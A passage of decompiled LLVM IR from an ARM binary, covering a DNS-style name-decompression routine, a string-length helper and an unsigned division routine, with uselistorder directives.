  ret i32 -1

; uselistorder directives
  uselistorder i32 %v0_14dec, { 0, 2, 1 }
  uselistorder i32 %v0_14dd4.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_14dcc, { 1, 0 }
  uselistorder i32 %v2_14db8, { 1, 0 }
  uselistorder i32 %v1_14dac, { 2, 0, 3, 1 }
  uselistorder i32 %v0_14dc0, { 2, 4, 0, 1, 5, 3, 6, 7, 8 }
  uselistorder i32 %v1_14d90, { 1, 0 }
  uselistorder i1 %v2_14dd420, { 1, 0 }
  uselistorder i32 %v9_14d60, { 1, 0 }
  uselistorder i32 %v6_14d60, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 3, 6, 2, 7, 4, 5, 1, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 7, 8, 3, 4, 5, 6, 0 }
  uselistorder i1* %cpsr_v.global-to-local, { 1, 2, 7, 8, 3, 4, 5, 6, 0 }
  uselistorder i1* %cpsr_n.global-to-local, { 1, 2, 7, 8, 3, 4, 5, 6, 0 }
  uselistorder i32 ()* @function_f030, { 12, 32, 31, 10, 11, 6, 5, 4, 30, 9, 8, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 7, 2, 0, 1, 3 }
  uselistorder i32 (i32, i32)* @function_14c58, { 2, 1, 0 }
  uselistorder i32 46, { 0, 2, 3, 1 }
  uselistorder i8* null, { 0, 1, 3, 4, 2, 5, 6 }
  uselistorder label %.loopexit, { 2, 0, 1 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %dec_label_pc_14dec, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_14de0, { 1, 0 }
  uselistorder label %dec_label_pc_14d94, { 1, 0 }
}

define i32 @function_14e08() local_unnamed_addr {
dec_label_pc_14e08:
  %fp.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_14e08 = load i32, i32* @r4, align 4
  %v6_14e08 = load i32, i32* @r5, align 4
  %v0_14e0c = load i32, i32* @r0, align 4
  store i32 %v0_14e0c, i32* %sl.global-to-local, align 4
  %v2_14e0c = icmp eq i32 %v0_14e0c, 0
  br i1 %v2_14e0c, label %.thread16, label %dec_label_pc_14eac.preheader

.thread16:                                        ; preds = %dec_label_pc_14e08
  %v0_14e181 = load i32, i32* @r2, align 4
  store i32 %v0_14e181, i32* %sb.global-to-local, align 4
  %v0_14e1c2 = load i32, i32* @r3, align 4
  store i32 %v0_14e1c2, i32* %stack_var_-40, align 4
  br label %dec_label_pc_14ecc

dec_label_pc_14eac.preheader:                     ; preds = %dec_label_pc_14e08
  store i32 0, i32* %r8.global-to-local, align 4
  %v0_14e18 = load i32, i32* @r2, align 4
  store i32 %v0_14e18, i32* %sb.global-to-local, align 4
  %v0_14e1c = load i32, i32* @r3, align 4
  store i32 %v0_14e1c, i32* %stack_var_-40, align 4
  store i32 1, i32* %fp.global-to-local, align 4
  %v1_14eac3952 = load i32, i32* @r1, align 4
  %v2_14eac4053 = add i32 %v1_14eac3952, %v0_14e0c
  %v3_14eac4154 = inttoptr i32 %v2_14eac4053 to i8*
  %v4_14eac4255 = load i8, i8* %v3_14eac4154, align 1
  %v6_14eac4356 = zext i8 %v4_14eac4255 to i32
  store i32 %v6_14eac4356, i32* @r4, align 4
  %v2_14eb04457 = icmp eq i8 %v4_14eac4255, 0
  br i1 %v2_14eb04457, label %bb35, label %dec_label_pc_14e30.lr.ph

dec_label_pc_14e30:                               ; preds = %dec_label_pc_14e30.lr.ph, %bb30
  %v2_14eb850 = phi i1 [ %v2_14eb84663, %dec_label_pc_14e30.lr.ph ], [ true, %bb30 ]
  %v6_14eac48 = phi i32 [ %v6_14eac4361, %dec_label_pc_14e30.lr.ph ], [ %v6_14eac, %bb30 ]
  %v1_14eac47 = phi i32 [ %v1_14eac3960, %dec_label_pc_14e30.lr.ph ], [ %v5_14e58, %bb30 ]
  %v1_14e34 = and i32 %v6_14eac48, 192
  br i1 %v2_14eb850, label %bb28, label %bb

bb:                                               ; preds = %dec_label_pc_14e30
  %v1_14e38 = load i32, i32* %r8.global-to-local, align 4
  %v2_14e38 = add i32 %v1_14e38, 1
  store i32 %v2_14e38, i32* %r8.global-to-local, align 4
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_14e30, %bb
  %v2_14e3c = icmp eq i32 %v1_14e34, 192
  %v1_14e40 = add i32 %v1_14eac47, 1
  store i32 %v1_14e40, i32* @r5, align 4
  br i1 %v2_14e3c, label %dec_label_pc_14e48, label %dec_label_pc_14e68

dec_label_pc_14e48:                               ; preds = %bb28
  %v2_14e48 = add i32 %v1_14e40, %v0_14e48.ph59
  %v3_14e48 = inttoptr i32 %v2_14e48 to i8*
  %v4_14e48 = load i8, i8* %v3_14e48, align 1
  %v6_14e48 = zext i8 %v4_14e48 to i32
  %v1_14e50 = urem i32 %v6_14eac48, 64
  br i1 %v2_14eb850, label %bb30, label %bb29

bb29:                                             ; preds = %dec_label_pc_14e48
  %v1_14e54 = load i32, i32* %r8.global-to-local, align 4
  %v2_14e54 = add i32 %v1_14e54, 1
  store i32 %v2_14e54, i32* %r8.global-to-local, align 4
  br label %bb30

bb30:                                             ; preds = %dec_label_pc_14e48, %bb29
  %v4_14e58 = mul nuw nsw i32 %v1_14e50, 256
  %v5_14e58 = or i32 %v6_14e48, %v4_14e58
  store i32 %v5_14e58, i32* %r1.global-to-local, align 4
  store i32 %storemerge17.ph58, i32* %r7.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  %v2_14eac = add i32 %v5_14e58, %v0_14e48.ph59
  %v3_14eac = inttoptr i32 %v2_14eac to i8*
  %v4_14eac = load i8, i8* %v3_14eac, align 1
  %v6_14eac = zext i8 %v4_14eac to i32
  store i32 %v6_14eac, i32* @r4, align 4
  %v2_14eb0 = icmp eq i8 %v4_14eac, 0
  br i1 %v2_14eb0, label %dec_label_pc_14eb8.bb36_crit_edge, label %dec_label_pc_14e30

dec_label_pc_14e68:                               ; preds = %bb28
  %v2_14e68 = add i32 %v6_14eac48, %storemerge17.ph58
  store i32 %v2_14e68, i32* %r6.global-to-local, align 4
  %v2_14e6c = load i32, i32* %stack_var_-40, align 4
  %v1_14e70 = add i32 %v2_14e68, 1
  store i32 %v1_14e70, i32* %r7.global-to-local, align 4
  %v3_14e74 = icmp ult i32 %v1_14e70, %v2_14e6c
  br i1 %v3_14e74, label %dec_label_pc_14e7c, label %dec_label_pc_14ecc

dec_label_pc_14e7c:                               ; preds = %dec_label_pc_14e68
  %v2_14e7c = add i32 %v1_14e40, %v0_14e48.ph59
  store i32 %v2_14e7c, i32* @r1, align 4
  %v0_14e80 = load i32, i32* %sb.global-to-local, align 4
  %v2_14e80 = add i32 %v0_14e80, %storemerge17.ph58
  store i32 %v2_14e80, i32* @r0, align 4
  store i32 %v6_14eac48, i32* @r2, align 4
  %v0_14e88 = call i32 @function_ef60()
  %v0_14e8c = load i32, i32* @r5, align 4
  %v1_14e8c = load i32, i32* @r4, align 4
  %v2_14e8c = add i32 %v1_14e8c, %v0_14e8c
  store i32 %v2_14e8c, i32* %r1.global-to-local, align 4
  %v0_14e90 = load i32, i32* %sl.global-to-local, align 4
  %v2_14e90 = add i32 %v0_14e90, %v2_14e8c
  %v3_14e90 = inttoptr i32 %v2_14e90 to i8*
  %v4_14e90 = load i8, i8* %v3_14e90, align 1
  %v0_14e94 = load i32, i32* %fp.global-to-local, align 4
  %v2_14e94 = icmp eq i32 %v0_14e94, 0
  br i1 %v2_14e94, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_14e7c
  %v1_14e98 = load i32, i32* %r8.global-to-local, align 4
  %v3_14e98 = add i32 %v1_14e98, %v1_14e8c
  store i32 %v3_14e98, i32* %r8.global-to-local, align 4
  br label %bb32

bb32:                                             ; preds = %dec_label_pc_14e7c, %bb31
  %v2_14e9c = icmp eq i8 %v4_14e90, 0
  br i1 %v2_14e9c, label %bb34, label %bb33

bb33:                                             ; preds = %bb32
  br label %bb34

bb34:                                             ; preds = %bb32, %bb33
  %v0_14ea4.off0 = phi i8 [ 0, %bb32 ], [ 46, %bb33 ]
  %v2_14ea4 = load i32, i32* %sb.global-to-local, align 4
  %v3_14ea4 = load i32, i32* %r6.global-to-local, align 4
  %v4_14ea4 = add i32 %v3_14ea4, %v2_14ea4
  %v5_14ea4 = inttoptr i32 %v4_14ea4 to i8*
  store i8 %v0_14ea4.off0, i8* %v5_14ea4, align 1
  %v0_14ea8.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_14eac.pre.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_14eb8.pre.pre = load i32, i32* %fp.global-to-local, align 4
  %v1_14eac39 = load i32, i32* %r1.global-to-local, align 4
  %v2_14eac40 = add i32 %v1_14eac39, %v0_14eac.pre.pre
  %v3_14eac41 = inttoptr i32 %v2_14eac40 to i8*
  %v4_14eac42 = load i8, i8* %v3_14eac41, align 1
  %v6_14eac43 = zext i8 %v4_14eac42 to i32
  store i32 %v6_14eac43, i32* @r4, align 4
  %v2_14eb044 = icmp eq i8 %v4_14eac42, 0
  %v2_14eb846 = icmp eq i32 %v0_14eb8.pre.pre, 0
  br i1 %v2_14eb044, label %dec_label_pc_14eb8, label %dec_label_pc_14e30.lr.ph

dec_label_pc_14e30.lr.ph:                         ; preds = %dec_label_pc_14eac.preheader, %bb34
  %v2_14eb84663 = phi i1 [ %v2_14eb846, %bb34 ], [ false, %dec_label_pc_14eac.preheader ]
  %v6_14eac4361 = phi i32 [ %v6_14eac43, %bb34 ], [ %v6_14eac4356, %dec_label_pc_14eac.preheader ]
  %v1_14eac3960 = phi i32 [ %v1_14eac39, %bb34 ], [ %v1_14eac3952, %dec_label_pc_14eac.preheader ]
  %v0_14e48.ph59 = phi i32 [ %v0_14eac.pre.pre, %bb34 ], [ %v0_14e0c, %dec_label_pc_14eac.preheader ]
  %storemerge17.ph58 = phi i32 [ %v0_14ea8.pre, %bb34 ], [ 0, %dec_label_pc_14eac.preheader ]
  br label %dec_label_pc_14e30

dec_label_pc_14eb8:                               ; preds = %bb34
  br i1 %v2_14eb846, label %dec_label_pc_14eb8.bb36_crit_edge, label %bb35

dec_label_pc_14eb8.bb36_crit_edge:                ; preds = %bb30, %dec_label_pc_14eb8
  %v0_14ec0.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_14ecc

bb35:                                             ; preds = %dec_label_pc_14eac.preheader, %dec_label_pc_14eb8
  %v1_14ebc = load i32, i32* %r8.global-to-local, align 4
  %v2_14ebc = add i32 %v1_14ebc, 1
  store i32 %v2_14ebc, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_14ecc

dec_label_pc_14ecc:                               ; preds = %dec_label_pc_14e68, %bb35, %dec_label_pc_14eb8.bb36_crit_edge, %.thread16
  %storemerge = phi i32 [ -1, %.thread16 ], [ %v0_14ec0.pre, %dec_label_pc_14eb8.bb36_crit_edge ], [ %v2_14ebc, %bb35 ], [ -1, %dec_label_pc_14e68 ]
  store i32 %v3_14e08, i32* @r4, align 4
  store i32 %v6_14e08, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge17.ph58, { 2, 1, 0 }
  uselistorder i32 %v0_14e48.ph59, { 2, 0, 1 }
  uselistorder i32 %v6_14eac, { 1, 0 }
  uselistorder i32 %v5_14e58, { 0, 2, 1 }
  uselistorder i32 %v6_14eac48, { 2, 1, 0, 3 }
  uselistorder i1 %v2_14eb850, { 1, 0 }
  uselistorder i32 %v0_14e0c, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-40, { 1, 2, 0 }
  uselistorder i32* %r8.global-to-local, { 0, 4, 8, 1, 5, 2, 6, 3, 7, 9 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 0, 3 }
  uselistorder i8 46, { 0, 3, 4, 1, 2, 5, 6, 7 }
  uselistorder i32 ()* @function_ef60, { 16, 15, 21, 14, 4, 13, 12, 2, 9, 8, 1, 0, 20, 11, 7, 6, 5, 22, 19, 18, 17, 10, 3 }
  uselistorder i32 64, { 0, 6, 2, 3, 4, 11, 7, 8, 5, 1, 9, 10 }
  uselistorder label %dec_label_pc_14ecc, { 1, 2, 0, 3 }
  uselistorder label %bb35, { 1, 0 }
  uselistorder label %dec_label_pc_14eb8.bb36_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_14e30.lr.ph, { 1, 0 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %bb32, { 1, 0 }
  uselistorder label %bb30, { 1, 0 }
  uselistorder label %bb28, { 1, 0 }
}

define i32 @function_14ed4() local_unnamed_addr {
dec_label_pc_14ed4:
  %v0_14ed8 = load i32, i32* @r0, align 4
  store i32 %v0_14ed8, i32* @lr, align 4
  %v2_14ed8 = icmp eq i32 %v0_14ed8, 0
  br i1 %v2_14ed8, label %bb, label %dec_label_pc_14ef0

bb:                                               ; preds = %dec_label_pc_14ed4
  ret i32 -1

dec_label_pc_14ee8:                               ; preds = %dec_label_pc_14ef8
  %v1_14ee8 = add i32 %v1_14f00, 2
  br label %dec_label_pc_14f18

dec_label_pc_14ef0:                               ; preds = %dec_label_pc_14ed4
  %v0_14ef0 = load i32, i32* @r1, align 4
  br label %dec_label_pc_14f00

dec_label_pc_14ef8:                               ; preds = %dec_label_pc_14f00
  %v1_14f0c = and i32 %v6_14f00, 192
  %v2_14f10 = add i32 %v6_14f00, %v1_14f04
  %v2_14ef8 = icmp eq i32 %v1_14f0c, 192
  br i1 %v2_14ef8, label %dec_label_pc_14ee8, label %dec_label_pc_14f00

dec_label_pc_14f00:                               ; preds = %dec_label_pc_14ef8, %dec_label_pc_14ef0
  %v1_14f00 = phi i32 [ %v2_14f10, %dec_label_pc_14ef8 ], [ %v0_14ef0, %dec_label_pc_14ef0 ]
  %v2_14f00 = add i32 %v1_14f00, %v0_14ed8
  %v3_14f00 = inttoptr i32 %v2_14f00 to i8*
  %v4_14f00 = load i8, i8* %v3_14f00, align 1
  %v6_14f00 = zext i8 %v4_14f00 to i32
  %v1_14f04 = add i32 %v1_14f00, 1
  %v2_14f08 = icmp eq i8 %v4_14f00, 0
  br i1 %v2_14f08, label %dec_label_pc_14f18, label %dec_label_pc_14ef8

dec_label_pc_14f18:                               ; preds = %dec_label_pc_14f00, %dec_label_pc_14ee8
  %v1_14f18 = phi i32 [ %v1_14ee8, %dec_label_pc_14ee8 ], [ %v1_14f04, %dec_label_pc_14f00 ]
  %v2_14f18 = sub i32 %v1_14f18, %v0_14ef0
  ret i32 %v2_14f18

; uselistorder directives
  uselistorder i32 %v6_14f00, { 1, 0 }
  uselistorder i32 %v1_14f00, { 2, 1, 0 }
  uselistorder i32 %v0_14ed8, { 0, 2, 1 }
  uselistorder i8 0, { 59, 17, 24, 25, 60, 16, 21, 61, 26, 27, 28, 29, 30, 48, 65, 63, 47, 64, 62, 46, 41, 7, 8, 66, 67, 71, 72, 23, 56, 57, 68, 69, 70, 14, 73, 42, 49, 75, 74, 50, 43, 76, 77, 78, 79, 80, 81, 9, 53, 85, 0, 83, 82, 51, 1, 84, 52, 2, 86, 87, 31, 3, 89, 88, 54, 90, 91, 92, 93, 44, 94, 96, 97, 95, 10, 11, 12, 98, 4, 15, 99, 100, 101, 18, 58, 103, 104, 105, 106, 102, 45, 107, 108, 109, 110, 32, 33, 34, 35, 36, 111, 19, 37, 13, 22, 5, 6, 113, 112, 38, 114, 115, 39, 116, 55, 20, 117, 118, 119, 120, 123, 121, 122, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 143, 142, 40, 144, 145, 146 }
  uselistorder i32 192, { 0, 4, 1, 5, 2, 7, 3, 6 }
}

define i32 @function_14f20() local_unnamed_addr {
dec_label_pc_14f20:
  %v0_14f20 = load i32, i32* @r1, align 4
  %v1_14f20 = add i32 %v0_14f20, -1
  %v7_14f20 = icmp eq i32 %v0_14f20, 1
  br i1 %v7_14f20, label %bb, label %bb82

bb:                                               ; preds = %dec_label_pc_14f20
  %v2_14f24 = load i32, i32* @r0, align 4
  ret i32 %v2_14f24

bb82:                                             ; preds = %dec_label_pc_14f20
  %v2_14f20 = icmp eq i32 %v0_14f20, 0
  br i1 %v2_14f20, label %dec_label_pc_15008, label %dec_label_pc_14f2c

dec_label_pc_14f2c:                               ; preds = %bb82
  %v0_14f2c = load i32, i32* @r0, align 4
  %tmp = icmp ugt i32 %v0_14f2c, %v0_14f20
  br i1 %tmp, label %dec_label_pc_14f34, label %dec_label_pc_14fc0

dec_label_pc_14f34:                               ; preds = %dec_label_pc_14f2c
  %v2_14f34 = and i32 %v1_14f20, %v0_14f20
  %v4_14f34 = icmp eq i32 %v2_14f34, 0
  br i1 %v4_14f34, label %dec_label_pc_14fcc, label %dec_label_pc_14f3c

dec_label_pc_14f3c:                               ; preds = %dec_label_pc_14f34
  %v3_14f3c = icmp ult i32 %v0_14f20, 536870912
  br i1 %v3_14f3c, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_14f3c
  %v4_14f40 = mul i32 %v0_14f20, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_14f3c, %.thread
  %v0_14f60.pr36.ph = phi i32 [ %v4_14f40, %.thread ], [ %v0_14f20, %dec_label_pc_14f3c ]
  %storemerge137 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_14f3c ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb85
  %v0_14f60.pr36 = phi i32 [ %v4_14f54, %bb85 ], [ %v0_14f60.pr36.ph, %.preheader.preheader ]
  %v1_14f58 = phi i32 [ %v4_14f58, %bb85 ], [ %storemerge137, %.preheader.preheader ]
  %v2_14f4c = icmp ugt i32 %v0_14f60.pr36, 268435455
  br i1 %v2_14f4c, label %.thread2, label %bb83

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_14f60thread-pre-split.loopexit

bb83:                                             ; preds = %.preheader
  %v4_14f50 = icmp ult i32 %v0_14f60.pr36, %v0_14f2c
  br i1 %v4_14f50, label %bb84, label %dec_label_pc_14f60thread-pre-split.loopexit.loopexit

bb84:                                             ; preds = %bb83
  %v2_14f54 = and i32 %v0_14f60.pr36, 268435456
  %v3_14f54 = icmp eq i32 %v2_14f54, 0
  %v4_14f54 = mul i32 %v0_14f60.pr36, 16
  br i1 %v3_14f54, label %bb85, label %dec_label_pc_14f60.loopexit

bb85:                                             ; preds = %bb84
  %v2_14f58 = and i32 %v1_14f58, 268435456
  %v3_14f58 = icmp eq i32 %v2_14f58, 0
  %v4_14f58 = mul i32 %v1_14f58, 16
  br i1 %v3_14f58, label %.preheader, label %dec_label_pc_14f60thread-pre-split.loopexit.loopexit

dec_label_pc_14f60thread-pre-split.loopexit.loopexit: ; preds = %bb85, %bb83
  %v1_14f6c48.ph = phi i32 [ %v1_14f58, %bb83 ], [ %v4_14f58, %bb85 ]
  %v0_14f60.pr38.ph = phi i32 [ %v0_14f60.pr36, %bb83 ], [ %v4_14f54, %bb85 ]
  br label %dec_label_pc_14f60thread-pre-split.loopexit

dec_label_pc_14f60thread-pre-split.loopexit:      ; preds = %dec_label_pc_14f60thread-pre-split.loopexit.loopexit, %.thread2
  %v1_14f6c48 = phi i32 [ %v1_14f58, %.thread2 ], [ %v1_14f6c48.ph, %dec_label_pc_14f60thread-pre-split.loopexit.loopexit ]
  %v0_14f60.pr38 = phi i32 [ %v0_14f60.pr36, %.thread2 ], [ %v0_14f60.pr38.ph, %dec_label_pc_14f60thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_14f60thread-pre-split

dec_label_pc_14f60thread-pre-split:               ; preds = %dec_label_pc_14f60thread-pre-split.loopexit, %bb87
  %v1_14f6c46 = phi i32 [ %v1_14f6c48, %dec_label_pc_14f60thread-pre-split.loopexit ], [ %v3_14f6c, %bb87 ]
  %v0_14f60.pr = phi i32 [ %v0_14f60.pr38, %dec_label_pc_14f60thread-pre-split.loopexit ], [ %v3_14f68, %bb87 ]
  br label %dec_label_pc_14f60

dec_label_pc_14f60.loopexit:                      ; preds = %bb84
  br label %dec_label_pc_14f60

dec_label_pc_14f60:                               ; preds = %dec_label_pc_14f60.loopexit, %dec_label_pc_14f60thread-pre-split
  %v1_14f6c = phi i32 [ %v1_14f6c46, %dec_label_pc_14f60thread-pre-split ], [ %v1_14f58, %dec_label_pc_14f60.loopexit ]
  %v1_14f68 = phi i32 [ %v0_14f60.pr, %dec_label_pc_14f60thread-pre-split ], [ %v4_14f54, %dec_label_pc_14f60.loopexit ]
  %v2_14f60 = icmp slt i32 %v1_14f68, 0
  br i1 %v2_14f60, label %dec_label_pc_14f74, label %bb86

bb86:                                             ; preds = %dec_label_pc_14f60
  %v4_14f64 = icmp ult i32 %v1_14f68, %v0_14f2c
  br i1 %v4_14f64, label %bb87, label %dec_label_pc_14f74

bb87:                                             ; preds = %bb86
  %v3_14f68 = mul i32 %v1_14f68, 2
  %v2_14f6c = icmp slt i32 %v1_14f6c, 0
  %v3_14f6c = mul i32 %v1_14f6c, 2
  br i1 %v2_14f6c, label %dec_label_pc_14f74, label %dec_label_pc_14f60thread-pre-split

dec_label_pc_14f74:                               ; preds = %bb86, %dec_label_pc_14f60, %bb87
  %v2_14f8059 = phi i32 [ %v3_14f6c, %bb87 ], [ %v1_14f6c, %bb86 ], [ %v1_14f6c, %dec_label_pc_14f60 ]
  %v1_14f7851 = phi i32 [ %v3_14f68, %bb87 ], [ %v1_14f68, %bb86 ], [ %v1_14f68, %dec_label_pc_14f60 ]
  br label %dec_label_pc_14f78

dec_label_pc_14f78:                               ; preds = %.thread11, %dec_label_pc_14f74
  %v1_14fac = phi i32 [ %v4_14fac, %.thread11 ], [ %v2_14f8059, %dec_label_pc_14f74 ]
  %v1_14f80 = phi i32 [ %v0_14fb8, %.thread11 ], [ 0, %dec_label_pc_14f74 ]
  %v1_14fb0 = phi i32 [ %v4_14fb0, %.thread11 ], [ %v1_14f7851, %dec_label_pc_14f74 ]
  %v1_14f7c = phi i32 [ %v0_14fa8, %.thread11 ], [ %v0_14f2c, %dec_label_pc_14f74 ]
  %v3_14f78 = icmp ult i32 %v1_14f7c, %v1_14fb0
  br i1 %v3_14f78, label %.thread7, label %bb88

bb88:                                             ; preds = %dec_label_pc_14f78
  %v3_14f7c = sub i32 %v1_14f7c, %v1_14fb0
  %v3_14f80 = or i32 %v1_14f80, %v1_14fac
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_14f78, %bb88
  %v1_14f88 = phi i32 [ %v1_14f7c, %dec_label_pc_14f78 ], [ %v3_14f7c, %bb88 ]
  %v1_14f8c = phi i32 [ %v1_14f80, %dec_label_pc_14f78 ], [ %v3_14f80, %bb88 ]
  %v4_14f84 = udiv i32 %v1_14fb0, 2
  %v6_14f84 = icmp ult i32 %v1_14f88, %v4_14f84
  br i1 %v6_14f84, label %.thread8, label %bb89

bb89:                                             ; preds = %.thread7
  %v3_14f88 = urem i32 %v1_14fb0, 2
  %v4_14f88 = icmp eq i32 %v3_14f88, 0
  %v6_14f88 = sub i32 %v1_14f88, %v4_14f84
  br i1 %v4_14f88, label %.thread8, label %bb90

bb90:                                             ; preds = %bb89
  %v5_14f8c = udiv i32 %v1_14fac, 2
  %v6_14f8c = or i32 %v1_14f8c, %v5_14f8c
  br label %.thread8

.thread8:                                         ; preds = %bb89, %.thread7, %bb90
  %v1_14f94 = phi i32 [ %v6_14f88, %bb89 ], [ %v1_14f88, %.thread7 ], [ %v6_14f88, %bb90 ]
  %v1_14f98 = phi i32 [ %v1_14f8c, %bb89 ], [ %v1_14f8c, %.thread7 ], [ %v6_14f8c, %bb90 ]
  %v4_14f90 = udiv i32 %v1_14fb0, 4
  %v6_14f90 = icmp ult i32 %v1_14f94, %v4_14f90
  br i1 %v6_14f90, label %.thread9, label %bb91

bb91:                                             ; preds = %.thread8
  %v3_14f94 = and i32 %v1_14fb0, 2
  %v4_14f94 = icmp eq i32 %v3_14f94, 0
  %v6_14f94 = sub i32 %v1_14f94, %v4_14f90
  br i1 %v4_14f94, label %.thread9, label %bb92

bb92:                                             ; preds = %bb91
  %v5_14f98 = udiv i32 %v1_14fac, 4
  %v6_14f98 = or i32 %v1_14f98, %v5_14f98
  br label %.thread9

.thread9:                                         ; preds = %bb91, %.thread8, %bb92
  %v1_14fa0 = phi i32 [ %v6_14f94, %bb91 ], [ %v1_14f94, %.thread8 ], [ %v6_14f94, %bb92 ]
  %v1_14fa4 = phi i32 [ %v1_14f98, %bb91 ], [ %v1_14f98, %.thread8 ], [ %v6_14f98, %bb92 ]
  %v4_14f9c = udiv i32 %v1_14fb0, 8
  %v6_14f9c = icmp ult i32 %v1_14fa0, %v4_14f9c
  br i1 %v6_14f9c, label %thread-pre-split, label %bb93

bb93:                                             ; preds = %.thread9
  %v3_14fa0 = and i32 %v1_14fb0, 4
  %v4_14fa0 = icmp eq i32 %v3_14fa0, 0
  %v6_14fa0 = sub i32 %v1_14fa0, %v4_14f9c
  br i1 %v4_14fa0, label %thread-pre-split, label %bb94

bb94:                                             ; preds = %bb93
  %v5_14fa4 = udiv i32 %v1_14fac, 8
  %v6_14fa4 = or i32 %v1_14fa4, %v5_14fa4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb94, %.thread9, %bb93
  %v0_14fb8 = phi i32 [ %v1_14fa4, %bb93 ], [ %v1_14fa4, %.thread9 ], [ %v6_14fa4, %bb94 ]
  %v0_14fa8 = phi i32 [ %v6_14fa0, %bb93 ], [ %v1_14fa0, %.thread9 ], [ %v6_14fa0, %bb94 ]
  %v2_14fa8 = icmp eq i32 %v0_14fa8, 0
  br i1 %v2_14fa8, label %dec_label_pc_14fb8, label %bb95

bb95:                                             ; preds = %thread-pre-split
  %tmp142 = icmp ult i32 %v1_14fac, 16
  br i1 %tmp142, label %dec_label_pc_14fb8, label %.thread11

.thread11:                                        ; preds = %bb95
  %v4_14fac = udiv i32 %v1_14fac, 16
  %v4_14fb0 = udiv i32 %v1_14fb0, 16
  br label %dec_label_pc_14f78

dec_label_pc_14fb8:                               ; preds = %thread-pre-split, %bb95
  ret i32 %v0_14fb8

dec_label_pc_14fc0:                               ; preds = %dec_label_pc_14f2c
  %v9_14f2c = icmp eq i32 %v0_14f2c, %v0_14f20
  %. = zext i1 %v9_14f2c to i32
  ret i32 %.

dec_label_pc_14fcc:                               ; preds = %dec_label_pc_14f34
  %v2_14fcc = icmp ugt i32 %v0_14f20, 65535
  br i1 %v2_14fcc, label %bb99, label %.thread16

bb99:                                             ; preds = %dec_label_pc_14fcc
  %v2_14fd0 = and i32 %v0_14f20, 32768
  %v3_14fd0 = icmp eq i32 %v2_14fd0, 0
  %v4_14fd0 = udiv i32 %v0_14f20, 65536
  br i1 %v3_14fd0, label %.thread16, label %bb100

.thread16:                                        ; preds = %bb99, %dec_label_pc_14fcc
  %v0_14fdc65 = phi i32 [ %v0_14f20, %dec_label_pc_14fcc ], [ %v4_14fd0, %bb99 ]
  br label %bb100

bb100:                                            ; preds = %bb99, %.thread16
  %v1_14fe0 = phi i32 [ %v0_14fdc65, %.thread16 ], [ %v4_14fd0, %bb99 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb99 ]
  %v2_14fdc = icmp ugt i32 %v1_14fe0, 255
  br i1 %v2_14fdc, label %bb101, label %.thread17

bb101:                                            ; preds = %bb100
  %v2_14fe0 = and i32 %v1_14fe0, 128
  %v3_14fe0 = icmp eq i32 %v2_14fe0, 0
  %v4_14fe0 = udiv i32 %v1_14fe0, 256
  br i1 %v3_14fe0, label %.thread17, label %bb102

bb102:                                            ; preds = %bb101
  %v2_14fe4 = or i32 %storemerge, 8
  br label %.thread17

.thread17:                                        ; preds = %bb101, %bb100, %bb102
  %v1_14ff0 = phi i32 [ %storemerge, %bb100 ], [ %storemerge, %bb101 ], [ %v2_14fe4, %bb102 ]
  %v1_14fec = phi i32 [ %v1_14fe0, %bb100 ], [ %v4_14fe0, %bb101 ], [ %v4_14fe0, %bb102 ]
  %v2_14fe8 = icmp ugt i32 %v1_14fec, 15
  br i1 %v2_14fe8, label %bb103, label %.thread18

bb103:                                            ; preds = %.thread17
  %v2_14fec = and i32 %v1_14fec, 8
  %v3_14fec = icmp eq i32 %v2_14fec, 0
  %v4_14fec = udiv i32 %v1_14fec, 16
  br i1 %v3_14fec, label %.thread18, label %bb104

bb104:                                            ; preds = %bb103
  %v2_14ff0 = add nsw i32 %v1_14ff0, 4
  br label %.thread18

.thread18:                                        ; preds = %bb103, %.thread17, %bb104
  %v4_14ff8 = phi i32 [ %v1_14ff0, %.thread17 ], [ %v1_14ff0, %bb103 ], [ %v2_14ff0, %bb104 ]
  %v5_14ffc = phi i32 [ %v1_14fec, %.thread17 ], [ %v4_14fec, %bb103 ], [ %v4_14fec, %bb104 ]
  %v2_14ff4 = icmp ugt i32 %v5_14ffc, 3
  %v7_14ff4 = icmp eq i32 %v5_14ffc, 4
  %v2_14ff8 = xor i1 %v7_14ff4, true
  %v3_14ff8 = and i1 %v2_14ff4, %v2_14ff8
  br i1 %v3_14ff8, label %bb105, label %bb106

bb105:                                            ; preds = %.thread18
  %v5_14ff8 = add nsw i32 %v4_14ff8, 3
